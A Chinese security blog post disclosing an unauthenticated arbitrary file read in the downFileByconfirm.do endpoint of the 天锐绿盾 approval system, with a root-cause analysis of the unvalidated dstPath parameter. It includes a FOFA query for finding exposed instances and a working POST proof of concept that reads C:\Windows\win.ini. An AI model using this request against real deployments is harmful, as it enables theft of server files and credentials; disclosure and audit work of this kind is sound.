---
title: "天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞"
source: https://mrxn.net/jswz/trwfe-downFileByconfirm-file-read.html
asset_dir: assets/天锐绿盾审批系统-downfilebyconfirm.do-任意文件读取漏洞
---

# 天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/18 08:25
- 467浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

鉴权

文件系统

身份验证

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞预警服务

该系统的 `downFileByconfirm.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。未经身份验证的攻击者可以通过该漏洞读取系统上的任意文件，从而可能获取数据库敏感信息或其他重要配置信息，导致数据泄露。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全研究工具

# 漏洞分析

先看`downFileByconfirm.do`的实现

[![天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞](images/img-001-16f8d46e5f3c.webp)](https://image.mrxn.net/3345664c86104ea2826d9654741df131.webp)

跟进`fileService.downFileByconfirm` 方法，看下`fileService.downFileByconfirm`的实现逻辑

深入探索

VPN服务

编码转换工具

编程语言教程

[![天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞](images/img-002-abcd62201e02.webp)](https://image.mrxn.net/b9ebfd3cacd44cba9d2d5f30383fe076.webp)

**直接将从用户端接收的** `dstPath` **参数，不经验证地用于** `new File(dstPath)` **来实例化文件对象，并最终传递给** `FileInputStream` **进行读取**，攻击者可以构造包含绝对路径或 `../` 目录遍历序列的恶意 `dstPath` 参数，[读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)服务器文件系统上任意位置的、具有应用运行权限可读的任何文件。

计算机安全

# 漏洞复现

```
POST /trwfe/file/downFileByconfirm.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded

dstPath=C:\Windows\win.ini&fileName=1.png&processInstanceIds=
```

成功读取到`C:\Windows\win.ini`文件内容

[![天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞](images/img-003-36eff2301499.webp)](https://image.mrxn.net/9828319e401d476499adb6b3758a4513.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
